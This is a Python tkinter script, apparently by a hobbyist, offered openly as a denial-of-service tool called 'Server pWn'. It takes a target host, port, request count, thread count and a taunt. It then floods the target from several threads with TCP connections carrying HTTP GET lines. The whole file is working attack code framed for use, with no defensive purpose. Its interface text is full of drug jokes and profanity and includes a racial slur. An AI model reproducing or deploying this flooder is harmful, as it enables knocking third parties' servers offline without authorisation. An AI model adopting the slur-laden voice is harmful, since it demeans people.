#!/usr/bin/env python3
'''

  Denial of Service by n0tty\n
  legendtanoybose@gmail.com
  http://tanoybose.co.nr
  
__________                     
\\______   \\ ____  ______ ____  
 |    |  _//  _ \\/  ___// __ \\ 
 |    |   (  <_> )___ \\\\  ___/ 
 |______  /\\____/____  >\\___  >
        \\/           \\/     \\/ 
        
'''

#Import Modules
import tkinter
import tkinter.messagebox
import random
from threading import Thread
from socket import socket, AF_INET, SOCK_STREAM
from sys import stdout



#Functions
#Quit
def fin():
    main.destroy()
#Exit
def exit_function():
    pass
#Fire
def auto_connections(host, port, requests, message):
    out_label["text"] = "pWning " + str(target_box_host.get()) + ":" + str(target_box_port.get()) + "..."
    try:
        for z in range(requests):
            sock = socket(AF_INET, SOCK_STREAM)
            sock.connect((str(host), int(port)))
            sock.send(bytes("GET / %s HTTP/1.1\r\n\r\n" % (str(message)), "utf-8"))
            sock.sendto(bytes("GET / %s HTTP/1.1\r\n\r\n" % (str(message)), "utf-8"), (host,port))
            sock.send(bytes("GET / %s HTTP/1.1\r\n\r\n" % (str(message)), "utf-8"))
            sock.close()
    except:
        out_label["text"] = "Error! Change Lighter!"
        exit_function()
    out_label["text"] = "Done " + str(requests_box.get()) + " requests on " + str(target_box_host.get()) + ":" + str(target_box_port.get())
def screw(host, port, requests, threads, message):
    requests_per_thread = int(requests/threads)
    try:
        for x in range(threads):
            Thread(target=auto_connections, args=(host, port, requests_per_thread, message)).start()
    except:
        out_label["text"] = "Error... Outta Weed!"
def pwn():
    try:
        out_label["text"] = "pWning " + str(target_box_host.get()) + ":" + str(target_box_port.get()) + "..."
        screw(str(target_box_host.get()), int(target_box_port.get()), int(requests_box.get()), int(threads_box.get()), str(message_box.get()))
        out_label["text"] = "pWn'd " + str(requests_box.get()) + " requests on " + str(target_box_host.get()) + ":" + str(target_box_port.get())
    except ValueError:
        out_label["text"] = "ValueError: Give neat weed Plj"
    except:
        out_label["text"] = "Error, Sad Dope Niggah!"

def dope():
    wisdom_words = ["Ganja Gun - Bob Marley","Legalize It - Peter Tosh", "Kaya - Bob Marley","It Must be the Ganja - Eminem", "Smoke Two Joints - Toyes", "Puff the Magic Dragon - Peter, Paul and Mary", "How to roll a blunt - Redman", "Stay High - Three 6 Mafia", "Mary Jane - Rick James"]
    out_label["text"] = wisdom_words[random.randrange(0,len(wisdom_words))]

#Main
main = tkinter.Tk()
main.title("Server pWn")
img = tkinter.PhotoImage(file='icon.png')
main.tk.call('wm', 'iconphoto', main._w, img)
main.minsize(300, 179)
main.maxsize(300, 179)


#Title
headline = tkinter.Label(main, text="Such DoS, Very pWn, Much Dope, Wow.", font="Arial 10 bold")
#Target
target_label = tkinter.Label(main, text="Target: ")
target_box_host = tkinter.Entry(main, relief="flat", bg="red", highlightthickness="0")
port_label = tkinter.Label(main, text="Port: ")
target_box_port = tkinter.Entry(main, width="6", relief="flat", bg="red", highlightthickness="0")
#Requests
requests_label = tkinter.Label(main, text="Requests: ")
requests_box = tkinter.Entry(main, width="34", relief="flat", bg="yellow", highlightthickness="0")
#Threads
threads_label = tkinter.Label(main, text="Threads: ")
threads_box = tkinter.Entry(main, width="34", relief="flat", bg="yellow", highlightthickness="0")
#Message
message_label = tkinter.Label(main, text="Taunt: ")
message_box = tkinter.Entry(main, width="34", relief="flat", bg="green", highlightthickness="0")
#Text Box
out_label = tkinter.Label(main)
out_label["text"] = "Ready.... Steady...."
#Buttons
exit_button = tkinter.Button(main, text="Fuk Off", command=fin, bg="red", relief="flat", activebackground="red", highlightthickness="0")
dope_button = tkinter.Button(main, text="DOPE", command=dope, bg="yellow", relief="flat", activebackground="green", highlightthickness="0")
fire_button = tkinter.Button(main, text="Blaze it!", command=pwn, bg="green", relief="flat", activebackground="green", highlightthickness="0")

#Placement
headline.place(x=15, y=0, anchor="nw")
target_label.place(x=7, y=30, anchor="nw")
target_box_host.place(x=77, y=30, anchor="nw")
port_label.place(x=210, y=30, anchor="nw")
target_box_port.place(x=244, y=30, anchor="nw")
requests_label.place(x=7, y=52, anchor="nw")
requests_box.place(x=77, y=52, anchor="nw")
threads_label.place(x=7, y=74, anchor="nw")
threads_box.place(x=77, y=74, anchor="nw")
message_label.place(x=7, y=96, anchor="nw")
message_box.place(x=77, y=96, anchor="nw")
out_label.place(x=7, y=120, anchor="nw")
exit_button.place(x=70, y=171, anchor="sw")
dope_button.place(x=120, y=171, anchor="sw")
fire_button.place(x=160, y=171, anchor="sw")

#Loop
main.mainloop()
